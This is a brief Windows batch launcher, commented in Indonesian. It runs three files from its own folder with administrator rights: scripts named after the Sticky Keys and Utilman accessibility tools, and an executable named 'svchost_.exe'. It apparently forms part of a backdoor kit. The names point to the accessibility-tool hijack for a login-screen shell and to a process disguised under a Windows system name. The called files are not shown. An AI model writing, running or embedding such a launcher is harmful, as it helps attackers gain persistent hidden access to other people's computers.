@echo off
:: Menjalankan batch dan exe dengan hak administrator dari folder yang sama

set "currentDir=%~dp0"

powershell -Command "Start-Process '%currentDir%ExecuteStickyKeys.bat' -Verb RunAs"
powershell -Command "Start-Process '%currentDir%ExecuteUtilman.bat' -Verb RunAs"
powershell -Command "Start-Process '%currentDir%svchost_.exe' -Verb RunAs"
